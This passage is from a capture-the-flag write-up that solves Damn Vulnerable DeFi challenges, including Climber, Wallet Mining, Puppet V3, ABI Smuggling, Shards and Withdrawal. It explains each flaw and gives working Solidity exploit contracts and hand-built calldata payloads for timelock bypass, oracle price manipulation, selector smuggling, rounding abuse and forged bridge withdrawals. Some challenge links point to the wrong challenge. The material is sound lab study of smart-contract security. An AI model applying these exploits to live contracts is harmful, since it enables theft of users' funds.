- All tokens must be transferred to the recovery wallet.

Key Concepts:
- Timelock mechanism

Solution:
- Under normal circumstances, `schedule` should be called first, followed by a time delay (Timelock), and finally, the operations are executed through `execute`. However, there is a logical flaw in the `execute()` function related to the order of operations: the actions are executed before the checks are made, instead of performing the checks first and then executing. This allows malicious operations to bypass the checks and directly alter the contract's state. The proper fix would be to move the `getOperationState(id)` check before executing the operation, ensuring that only legitimate and scheduled operations can be executed.
- By exploiting this bug, I can place the intended payload in the first few items of the array, and the last item can simply execute `schedule` to update the state.
```
function execute(address[] calldata targets, uint256[] calldata values, bytes[] calldata dataElements, bytes32 salt)
    external
    payable
{
...

    bytes32 id = getOperationId(targets, values, dataElements, salt);

    for (uint8 i = 0; i < targets.length;) {
        targets[i].functionCallWithValue(dataElements[i], values[i]);
        unchecked {
            ++i;
        }
    }

    //vulnerable logic
    if (getOperationState(id) != OperationState.ReadyForExecution) {
        revert NotReadyForExecution(id);
    }

    operations[id].executed = true;
}
```
![Screenshot_2024-09-05_at_9_27_53 AM](https://hackmd.io/_uploads/SJKtctLnA.png)



- Exploit steps: `grantRole` to acquire `PROPOSER_ROLE` -> update `delay` to 0 -> `transferOwnership` -> `timelockSchedule` -> upgrade the contract -> withdraw -> done.

[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/climber/Climber.t.sol) :

```
    function test_climber() public checkSolvedByPlayer {

            Exploit exploit = new Exploit(payable(timelock),address(vault));
            exploit.timelockExecute();
            PawnedClimberVault newVaultImpl = new PawnedClimberVault();
            vault.upgradeToAndCall(address(newVaultImpl),"");
            PawnedClimberVault(address(vault)).withdrawAll(address(token),recovery);  
    }
contract Exploit {
    address payable private immutable timelock;

    uint256[] private _values = [0, 0, 0,0];
    address[] private _targets = new address[](4);
    bytes[] private _elements = new bytes[](4);

    constructor(address payable _timelock, address _vault) {
        timelock = _timelock;
        _targets = [_timelock, _timelock, _vault, address(this)];

        _elements[0] = (
            abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this))
        );
        _elements[1] = abi.encodeWithSignature("updateDelay(uint64)", 0);
        _elements[2] = abi.encodeWithSignature("transferOwnership(address)", msg.sender);
        _elements[3] = abi.encodeWithSignature("timelockSchedule()");
    }

    function timelockExecute() external {
        ClimberTimelock(timelock).execute(_targets, _values, _elements, bytes32("123"));
    }

    function timelockSchedule() external {
        ClimberTimelock(timelock).schedule(_targets, _values, _elements, bytes32("123"));
    }
}


contract PawnedClimberVault is ClimberVault {
/// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }
    function withdrawAll(address tokenAddress, address receiver) external onlyOwner {
        // withdraw the whole token balance from the contract
        IERC20 token = IERC20(tokenAddress);
        require(token.transfer(receiver, token.balanceOf(address(this))), "Transfer failed");
    }
}
```

### 13. Wallet Mining

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/wallet-mining/)


Conditions:
- The `Factory` contract must have code.
- Ensure that the Safe copy address returned by `walletDeployer.cpy()` contains code.
- The `USER_DEPOSIT_ADDRESS` must have code present.
- Neither the deposit address nor the wallet deployment contract may hold any tokens.
- Confirm that the user's nonce is still 0, indicating the user hasn't executed any transactions.
- Only one transaction can be executed.
- The number of tokens held in the user's wallet must equal `DEPOSIT_TOKEN_AMOUNT`.
- Confirm that the guardian's (`ward`) token balance matches the initial balance of the `walletDeployer` contract, indicating that the player has transferred the required funds to the guardian.

Key Concepts:
- Create vs Create2
- Eip1155 vs replay
- Safe wallet 
    - Safe.setup(): initial storage of the Safe contract
    - SafeProxy.creationCode: creation code used for the Proxy deployment. With this it is easily possible to calculate predicted address.
    - SafeProxyFactory:  - Allows to create a new proxy contract and execute a message call to the new proxy within one transaction.
    - Foundry computeCreate2Address & [computeCreateAddress](https://book.getfoundry.sh/reference/forge-std/compute-create-address#computecreateaddress)
- Proxy Storage collision

[REF: OP hacked](https://mirror.xyz/0xbuidlerdao.eth/lOE5VN-BHI0olGOXe27F0auviIuoSlnou_9t3XRJseY)

Solution:
- By using `computeCreate2Address`, calculate the `USER_DEPOSIT_ADDRESS`, which gives a nonce of 13. Then, through the challenge's `walletDeployer.drop()`, use `createProxyWithNonce` to create the user's Safe wallet.
- The `AuthorizerUpgradeable` contract occupies `slot0` with `needsInit`, leading to a storage collision. We can initialize the user's wallet and change the guardian (`ward`) to ourselves, receiving 1 ETH.


[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/wallet-mining/WalletMining.t.sol) :
 
```
    // Find the correct nonce using computeCreate2Address                      
                address target = vm.computeCreate2Address(
                keccak256(abi.encodePacked(keccak256(initializer), nonce)),
                keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy))))), //initCodeHash
                address(proxyFactory)
            );
    // 另一種寫法  Find the correct nonce using manual CREATE2 address   
         // Calculate the salt (combining the initializer hash and nonce)
            bytes32 salt = keccak256(abi.encodePacked(keccak256(initializer), nonce));

            // Calculate the creation code hash (SafeProxy creation bytecode)
            bytes32 creationCodeHash = keccak256(abi.encodePacked(type(SafeProxy).creationCode, uint256(uint160(address(singletonCopy)))));

            // Manually compute the CREATE2 address
            address target = address(uint160(uint256(keccak256(
                abi.encodePacked(
                    hex"ff",                    // Constant value
                    address(proxyFactory),      // Deployer address (proxyFactory)
                    salt,                       // Salt value
                    creationCodeHash            // Keccak256 of creation code
                )
            ))));
```
 
 
 
### 14. Puppet V3

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/climber/)

Conditions:
- The transaction must be completed within `block.timestamp - initialBlockTimestamp < 115` seconds.
- The token balance in the lending pool must be zero.
- All `LENDING_POOL_INITIAL_TOKEN_BALANCE` tokens must be transferred to the recovery wallet.

Key Concepts:
- Uniswap TWAP (Time-Weighted Average Price) oracle.

Solution:
- Take note that the price retrieved by `calculateDepositOfWETHRequired` will be three times higher.

```
    function calculateDepositOfWETHRequired(uint256 amount) public view returns (uint256) {
        uint256 quote = _getOracleQuote(_toUint128(amount));
        return quote * DEPOSIT_FACTOR;
    }
```
- The pool contains 100 WETH and 100 DVT tokens, with relatively low liquidity. The `PuppetV3Pool.sol` contract uses a 10-minute TWAP period to calculate the price of DVT tokens. This setup makes the contract vulnerable to price manipulation attacks without much cost! With this method, we can exchange the 110 DVT tokens we own for WETH, making DVT tokens incredibly cheap. The oracle calculates the current price based on price data from the past 10 minutes. However, because the TWAP period is short, by making large trades within this 10-minute window (such as swapping a large amount of DVT), the price can be significantly manipulated.
- Since TWAP is a delayed price mechanism, after manipulating the price, there is a brief time window (e.g., 110 seconds) for the attacker to take advantage of the lowered price and execute unfair loans. This window allows the attacker to exploit the price discrepancy before the TWAP price recovers to its normal level.

[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/puppet-v3/PuppetV3.t.sol) :

```
    function test_puppetV3() public checkSolvedByPlayer {
       address uniswapRouterAddress = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
        token.approve(address(uniswapRouterAddress), type(uint256).max);
uint256 quote1 = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
console.log("beofre quote: ", quote1); //quote:3000000000000000000000000

 
        ISwapRouter(uniswapRouterAddress).exactInputSingle(
            ISwapRouter.ExactInputSingleParams(
                address(token),
                address(weth),
                3000,
                address(player),
                block.timestamp,
                PLAYER_INITIAL_TOKEN_BALANCE, // 110 DVT TOKENS
                0,
                0
            )
        );  
         vm.warp(block.timestamp + 114);
        uint256 quote = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        weth.approve(address(lendingPool), quote);
        console.log("quote: ", quote);
        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
        token.transfer(recovery,LENDING_POOL_INITIAL_TOKEN_BALANCE);
    }
```


### 15. ABI Smuggling

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/climber/)

Conditions:
- The vault balance must be zero.
- All `VAULT_TOKEN_BALANCE` tokens must be transferred to the recovery wallet.

Key Concepts:
- EVM Calldata composition.

Solution:
- In `AuthorizedExecutor.execute()`, `calldataload` is used to extract 4 bytes of the function selector from the provided `actionData` starting at the `calldataOffset` (100 bytes) and then checks whether this ID is authorized using `getActionId`.
- The `deployer` can execute `sweepFunds` with the selector `0x85fb709d`, and the `player` can execute `withdraw` with the selector `0xd9caed12`.
- The key is to bypass the `getActionId` check, which allows arbitrary execution of `functionCall`.

```
        if (!permissions[getActionId(selector, msg.sender, target)]) {
            revert NotAllowed();
        }

 
        return target.functionCall(actionData);
```
- Prepare the payload. In the ABI encoding of the `execute()` function, `actionData` is a dynamically sized `bytes` parameter.
- `0x80` is an offset that points to the starting position of the actual data in `actionData`. This offset is calculated relative to the start of the entire calldata. So in this case, it's `0x80`.

```
// execute selector
0x1cff79cd
// vault.address （第一個 32 字節）
0000000000000000000000001240fa2a84dd9157a0e76b5cfe98b1d52268b264
// offset -> 這個偏移量指向 actionData 在 calldata 中的起始位置。0x80 是 128 字節 （第二個 32 字節）
0000000000000000000000000000000000000000000000000000000000000080
// 這個部分沒有實際用途，通常用來填充固定長度的位置 （第三個 32 字節）
0000000000000000000000000000000000000000000000000000000000000000
// withdraw() 繞過檢查 （第四個 32 字節）
**d9caed12**00000000000000000000000000000000000000000000000000000000
// 這表示 actionData 的總長度是 68 字節（0x44 為十六進制的 68） actionData ( 4 + 32 + 32)
0000000000000000000000000000000000000000000000000000000000000044
// sweepFunds calldata
85fb709d00000000000000000000000073030b99950fb19c6a813465e58a0bca5487fbea0000000000000000000000008ad159a275aee56fb2334dbb69036e9c7bacee9b
```

[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/abi-smuggling/ABISmuggling.t.sol) :
```
    function test_abiSmuggling() public checkSolvedByPlayer {
        Exploit exploit = new Exploit(address(vault),address(token),recovery);
        bytes memory payload = exploit.executeExploit();
        address(vault).call(payload);
    }

contract Exploit {
    SelfAuthorizedVault public vault;
    IERC20 public token;
    address public player;
    address public recovery;

    // Event declarations for logging
    event LogExecuteSelector(bytes executeSelector);
    event LogTargetAddress(bytes target);
    event LogDataOffset(bytes dataOffset);
    event LogEmptyData(bytes emptyData);
    event LogWithdrawSelectorPadded(bytes withdrawSelectorPadded);
    event LogActionDataLength(uint actionDataLength);
    event LogSweepFundsCalldata(bytes sweepFundsCalldata);
    event LogCalldataPayload(bytes calldataPayload);

    constructor(address _vault, address _token, address _recovery) {
        vault = SelfAuthorizedVault(_vault);
        token = IERC20(_token);
        recovery = _recovery;
        player = msg.sender;
    }

    function executeExploit() external returns (bytes memory) {
        require(msg.sender == player, "Only player can execute exploit");

        // `execute()` function selector
        bytes4 executeSelector = vault.execute.selector;

        // Construct the target contract address, which is the vault address, padded to 32 bytes
        bytes memory target = abi.encodePacked(bytes12(0), address(vault));

        // Construct the calldata start location offset
        bytes memory dataOffset = abi.encodePacked(uint256(0x80)); // Offset for the start of the action data

        // Construct the empty data filler (32 bytes of zeros)
        bytes memory emptyData = abi.encodePacked(uint256(0));

        // Manually define the `withdraw()` function selector as `d9caed12` followed by zeros
        bytes memory withdrawSelectorPadded = abi.encodePacked(
            bytes4(0xd9caed12),     // Withdraw function selector
            bytes28(0)              // 28 zero bytes to fill the 32-byte slot
        );

        // Construct the calldata for the `sweepFunds()` function
        bytes memory sweepFundsCalldata = abi.encodeWithSelector(
            vault.sweepFunds.selector,
            recovery,
            token
        );

        // Manually set actionDataLength to 0x44 (68 bytes)
        uint256 actionDataLengthValue = sweepFundsCalldata.length;
        emit LogActionDataLength(actionDataLengthValue);
        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));


        // Combine all parts to create the complete calldata payload
        bytes memory calldataPayload = abi.encodePacked(
            executeSelector,              // 4 bytes
            target,                       // 32 bytes
            dataOffset,                   // 32 bytes
            emptyData,                    // 32 bytes
            withdrawSelectorPadded,       // 32 bytes (starts at the 100th byte)
            actionDataLength,             // Length of actionData
            sweepFundsCalldata            // The actual calldata to `sweepFunds()`
        );

        // Emit the calldata payload for debugging
        emit LogCalldataPayload(calldataPayload);

        // Return the constructed calldata payload
        return calldataPayload;
    }
}
```

```
REF
ABI encoding of dynamic types (bytes, strings)
In the ABI Standard, dynamic types are encoded the following way:

The offset of the dynamic data
The length of the dynamic data
The actual value of the dynamic data.
Memory loc      Data
0x00            0000000000000000000000000000000000000000000000000000000000000020 // The offset of the data (32 in decimal)
0x20            000000000000000000000000000000000000000000000000000000000000000d // The length of the data in bytes (13 in decimal)
0x40            48656c6c6f2c20776f726c642100000000000000000000000000000000000000 // actual value
If you hex decode 48656c6c6f2c20776f726c6421 you will get "Hello, world!".
```

### 16. Shards

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/shards/)

Conditions:
- The token balance in the staking contract must remain unchanged.
- The number of missing tokens (`missingTokens`) in the marketplace must be greater than 0.01% of `initialTokensInMarketplace`.
- All recovered funds must be transferred to the recovery wallet.
- Only one transaction must be executed.

Key Concepts:
- `mulDivDown` rounds down to 0.

Solution:
- The challenge starts with one NFT for sale, but the player doesn’t have DVT tokens. So how can the game continue?
- While examining `fill()`, it is discovered that `want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)` calculates the number of shards a buyer can purchase based on `want`. However, the calculation in this function may experience underflows or calculation errors, especially with the combination of `mulDivDown` and `_toDVT`. This algorithm causes the final result to be 0 when `want` is a small value. This seems to be the crux of the challenge. Thus, we can acquire a significant number of NFT shards by paying 0 DVT tokens. The maximum value of `want` that can result in a 0-price purchase is 133.
- Using the 0-cost NFT shards, you can use `cancel()` to return the shards to the marketplace, and at this point, you will receive DVT tokens.
- I executed a Proof of Concept (POC) 10,001 times in a local environment without failing. If it fails in a private fork environment, the algorithm can be adjusted accordingly.


```
    function fill(uint64 offerId, uint256 want) external returns (uint256 purchaseIndex) {

        paymentToken.transferFrom(
            msg.sender, address(this), want.mulDivDown(_toDVT(offer.price, _currentRate), offer.totalShards)
        );
        if (offer.stock == 0) _closeOffer(offerId);
    }
    function _toDVT(uint256 _value, uint256 _rate) private pure returns (uint256) {
        return _value.mulDivDown(_rate, 1e6);
    }

```


[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/shards/Shards.t.sol) :

```
 
    function test_shards() public checkSolvedByPlayer {

        Exploit exploit = new Exploit(marketplace,token,recovery);
        exploit.attack(1);
        console.log("recovery balance",token.balanceOf(address(recovery)));
        
    }
contract Exploit {
    ShardsNFTMarketplace public marketplace;
    DamnValuableToken public token;
    address recovery;

    constructor(ShardsNFTMarketplace _marketplace, DamnValuableToken _token, address _recovery) {
        marketplace = _marketplace;
        token = _token;
        recovery = _recovery;
    }

    function attack(uint64 offerId) external {
        uint256 wantShards = 100; // Fill 100 shards per call

        // Loop 10 times to execute fill(1, 100)
        for (uint256 i = 0; i < 10001; i++) {
            marketplace.fill(offerId, wantShards);
            marketplace.cancel(1,i);
        }

        token.transfer(recovery,token.balanceOf(address(this)));
    }
}
```

### 17. Curvy Puppet

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/curvy-puppet/)

Conditions:
- All user positions must be liquidated.
- The Treasury still holds LP tokens.
- The Treasury still holds 7,500 DVT.
- The player's DVT, stETH, and LP balances must be 0.

Key Concepts:
- Read-only reentrancy.

Solution:
- Seeing Curve immediately brings to mind the classic read-only reentrancy attack. However, it's not that simple because the challenge only provides 200 ETH and 6.5 LP, which is not enough to manipulate the pool prices on the Mainnet.
- I was stuck for two nights, testing multiple methods that all failed. I was unable to manipulate the liquidation value. To liquidate, the condition `if (collateralValue >= borrowValue) revert HealthyPosition(borrowValue, collateralValue);` must be satisfied.
- Finally, I succeeded by using two flashloans to complete the challenge.
- The key is that Balancer allows borrowing WETH without fees. This allowed me to calculate a sufficient amount for liquidation while having enough funds to repay the flashloan.
    
### 18. Withdrawal

[Challenge](https://www.damnvulnerabledefi.xyz/challenges/withdrawal/)

Conditions:
- The L1 Token Bridge must retain at least 99% of the tokens.
- The player's token balance must be 0.
- The `counter()` value of the L1 Gateway must be greater than or equal to `WITHDRAWALS_AMOUNT`, indicating that a sufficient number of withdrawals have been completed.
- The following four withdrawal IDs must all be marked as completed:
  - hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba" (first withdrawal)
  - hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60" (second withdrawal)
  - hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015" (third withdrawal)
  - hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09" (fourth withdrawal)

Key Concepts:
- Cross-chain transactions L2 -> L1:
  - `L2Handler.sendMessage`: On L2, `L2Handler` sends the cross-chain message.
  - `L1Forwarder.forwardMessage`: On L1, `L1Forwarder` forwards the message.
  - `L1Gateway.finalizeWithdrawal`: `L1Gateway` finalizes the withdrawal, completing the cross-chain operation.
  - `TokenBridge.executeTokenWithdrawal`: `TokenBridge` performs the token transfer, sending the tokens to the recipient.
- Calldata decoding

Solution:
- The challenge provides `withdrawals.json`, which contains the logs of four `MessageStored` events sent from L2 to L1.
  - The event signature of `MessageStored` is `0x43738d03`, obtained from `keccak256("MessageStored(bytes32,uint256,address,address,uint256,bytes)")`.
- Next, decode the `data` field to understand the operations inside.


```
eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba // id
0000000000000000000000000000000000000000000000000000000066729b63 // timestamp
0000000000000000000000000000000000000000000000000000000000000060 // data.offset
0000000000000000000000000000000000000000000000000000000000000104 // data.length
01210a38                                                         // L1Forwarder.forwardMessage.selector
0000000000000000000000000000000000000000000000000000000000000000 // L2Handler.nonce
000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // l2Sender
0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd50 // target (l1TokenBridge)
0000000000000000000000000000000000000000000000000000000000000080 // message.offset
0000000000000000000000000000000000000000000000000000000000000044 // message.length
81191e51                                                         // TokenBridge.executeTokenWithdrawal.selector
000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac6 // receiver
0000000000000000000000000000000000000000000000008ac7230489e80000 // amount (10e18)
0000000000000000000000000000000000000000000000000000000000000000
000000000000000000000000000000000000000000000000
```
- If the caller of `L1Gateway.finalizeWithdrawal` is an Operator, the contract does not check the MerkleProof. Since the player has the Operator role, it is possible to forge requests and withdraw tokens from the token bridge. We can first rescue 900,000 tokens.
- One of the conditions for completing the challenge is to finalize the status of the four transactions in `withdrawals.json`, so we need to send these four requests using `L1Gateway.finalizeWithdrawal`. Although we rescued 900,000 tokens beforehand, and the third request attempts to transfer 999,000 tokens (which will fail), this failure does not trigger a status check, so the entire transaction won't be reverted.
![Screenshot 2024-09-06 at 3.35.56 PM](https://hackmd.io/_uploads/H1Oy-NO3A.png)
 
- Lastly, return the rescued tokens to the `tokenBridge`.

[POC](https://github.com/SunWeb3Sec/damn-vulnerable-defi-solutions/tree/main//test/withdrawal/Withdrawal.t.sol) :

```
    function test_withdrawal() public checkSolvedByPlayer {

        // fake withdrawal operation and obtain tokens
        bytes memory message = abi.encodeCall(
            L1Forwarder.forwardMessage,
            (
                0, // nonce
                address(0), //  
                address(l1TokenBridge), // target
                abi.encodeCall( // message
                    TokenBridge.executeTokenWithdrawal,
                    (
                        player, // deployer receiver
                        900_000e18 //rescue 900_000e18
                    )
                )
            )
        );

        l1Gateway.finalizeWithdrawal(
            0, // nonce
            l2Handler, // pretend l2Handler 
            address(l1Forwarder), // target is l1Forwarder
            block.timestamp - 7 days, // to pass 7 days waiting peroid
            message, 
            new bytes32[](0)   
        );

        // Perform finalizedWithdrawals due to we are operator, don't need to provide merkleproof.
        
        vm.warp(1718786915 + 8 days);
        // first finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            0, // nonce 0
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786915, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000328809bc894f92807417d2dad6b7c998c1afdac60000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // second finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            1, // nonce 1
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718786965, // timestamp
            hex"01210a3800000000000000000000000000000000000000000000000000000000000000010000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e510000000000000000000000001d96f2f6bef1202e4ce1ff6dad0c2cb002861d3e0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // third finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            2, // nonce 2
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787050, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000002000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e00000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000ea475d60c118d7058bef4bdd9c32ba51139a74e000000000000000000000000000000000000000000000d38be6051f27c260000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );

        // fourth finalizeWithdrawal
        l1Gateway.finalizeWithdrawal(
            3, // nonce 3
            0x87EAD3e78Ef9E26de92083b75a3b037aC2883E16, // l2Sender
            0xfF2Bd636B9Fc89645C2D336aeaDE2E4AbaFe1eA5, // target
            1718787127, // timestamp
            hex"01210a380000000000000000000000000000000000000000000000000000000000000003000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000009c52b2c4a89e2be37972d18da937cbad8aa8bd500000000000000000000000000000000000000000000000000000000000000080000000000000000000000000000000000000000000000000000000000000004481191e51000000000000000000000000671d2ba5bf3c160a568aae17de26b51390d6bd5b0000000000000000000000000000000000000000000000008ac7230489e8000000000000000000000000000000000000000000000000000000000000", // message
            new bytes32[](0)    // Merkle proof
        );
 
        token.transfer(address(l1TokenBridge),900_000e18);
        console.log("token.balanceOf(address(l1TokenBridge)",token.balanceOf(address(l1TokenBridge)));
        
    }
    
```
